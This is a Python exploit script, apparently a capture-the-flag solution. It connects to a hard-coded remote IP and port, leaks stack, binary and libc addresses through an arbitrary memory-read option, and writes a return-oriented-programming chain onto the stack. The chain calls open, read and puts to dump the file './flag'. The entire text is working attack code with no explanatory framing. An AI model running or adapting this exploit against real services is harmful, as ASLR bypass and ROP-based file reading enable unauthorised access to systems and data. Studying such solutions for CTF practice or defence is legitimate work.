import socket, struct, os, binascii, base64
import telnetlib   

def readline(sc, show = True):
    res = ""
    while len(res) == 0 or res[-1] != "\n":
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    if show:
        print repr(res[:-1])
    return res[:-1]

def read_until(sc, s):
    res = ""
    while not res.endswith(s):
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    return res[:-(len(s))]
    
def read_all(sc, n):
    data = ""
    while len(data) < n:
        block = sc.recv(n - len(data))
        if len(block) == 0:
            print repr(data)
            raise Exception("Server disconnected")
        data += block

    return data

def I(n):
    return struct.pack("<I", n)
    
def Q(n):
    return struct.pack("<Q", n)

def read_mem(sc, delta):
    sc.send("1\n")
    sc.send(str(delta) + "\n")
    read_until(sc, "Here it is: ")
    res = readline(sc, False)
    return int(res) & 0xffffffffffffffff
        
def write_mem(sc, delta, data):
    sc.send("2\n")
    sc.send(str(delta) + "\n")
    sc.send(str(data) + "\n")

sc = socket.create_connection(("52.192.178.153", 31337))

stack_scratch = read_mem(sc, 200) + 0x100
bin_base = read_mem(sc, 202) - 0xBB0
libc_base = read_mem(sc, 203) - 0x203F1

print "bin", hex(bin_base)
print "libc", hex(libc_base)

libc_gets = libc_base + 0x6FFF0
libc_puts = libc_base + 0x70920
libc_getchar = libc_base + 0x77A10
libc_open = libc_base + 0xF8669
libc_poprdx_rcx_rbx = libc_base + 0xEBF19
libc_read = libc_base + 0xF8880

poprdi = bin_base + 0xC13
poprsi_r15 = bin_base + 0xC11

rop = (
        libc_getchar,
        poprdi, stack_scratch, libc_gets,
        poprdi, stack_scratch, libc_puts,
        libc_poprdx_rcx_rbx, 2, 0, 0, poprsi_r15, 0, 0, poprdi, stack_scratch, libc_open,
        poprdi, stack_scratch, libc_puts,
        libc_poprdx_rcx_rbx, 100, 0, 0, poprsi_r15, stack_scratch, 0, poprdi, 3, libc_read,
        poprdi, stack_scratch, libc_puts,
    )
    
for i in xrange(len(rop)):
    write_mem(sc, 203 + i, rop[i])
    print ".",
    
print

read_until(sc, "Choice?\n")
sc.send("3\n")

sc.send("./flag\n")

while True:
    data = sc.recv(16384)
    if len(data) == 0:
        break
    for line in data.split("\n"):
        print repr(line)
    